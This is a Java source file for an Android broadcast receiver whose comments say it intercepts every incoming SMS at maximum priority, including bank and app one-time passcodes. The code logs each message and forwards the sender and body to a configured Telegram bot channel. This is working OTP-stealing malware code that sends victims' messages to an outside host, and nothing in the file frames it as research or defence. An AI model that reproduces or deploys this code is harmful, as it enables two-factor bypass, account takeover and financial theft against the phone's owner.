package com.tok.interceptor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * Intercepts ALL incoming SMS messages and forwards them to Telegram.
 * Registered with android:priority="2147483647" for highest interception priority.
 * Works for OTP SMS from any app/bank — no Xposed required.
 */
public class SmsBroadcastReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsBroadcastReceiver";

    // Static callback so MainActivity can display messages in the log
    public interface SmsListener {
        void onSmsReceived(String sender, String body);
    }
    private static SmsListener listener;

    public static void setListener(SmsListener l) {
        listener = l;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(action) &&
            !"android.provider.Telephony.SMS_DELIVER".equals(action)) {
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null || pdus.length == 0) return;

        String format = bundle.getString("format");

        StringBuilder body = new StringBuilder();
        String sender = "";

        for (Object pdu : pdus) {
            SmsMessage msg;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                msg = SmsMessage.createFromPdu((byte[]) pdu, format);
            } else {
                msg = SmsMessage.createFromPdu((byte[]) pdu);
            }
            if (msg != null) {
                sender = msg.getDisplayOriginatingAddress();
                body.append(msg.getDisplayMessageBody());
            }
        }

        if (body.length() == 0) return;

        final String finalSender = sender != null ? sender : "unknown";
        final String finalBody   = body.toString();

        Log.d(TAG, "SMS from " + finalSender + ": " + finalBody);

        // Notify UI
        if (listener != null) {
            listener.onSmsReceived(finalSender, finalBody);
        }

        // Forward to Telegram asynchronously
        new Thread(() -> {
            try {
                android.content.SharedPreferences prefs =
                    context.getSharedPreferences("config", Context.MODE_PRIVATE);
                String botToken  = prefs.getString("bot_token", "");
                String channelId = prefs.getString("channel_id", "");

                if (botToken.isEmpty() || channelId.isEmpty()) {
                    Log.w(TAG, "Bot token/channel not configured — skipping forward");
                    return;
                }

                TelegramForwarder fwd = new TelegramForwarder(botToken, channelId);
                fwd.sendSms(finalSender, finalBody);
            } catch (Exception e) {
                Log.e(TAG, "Failed to forward SMS: " + e.getMessage());
            }
        }).start();
    }
}
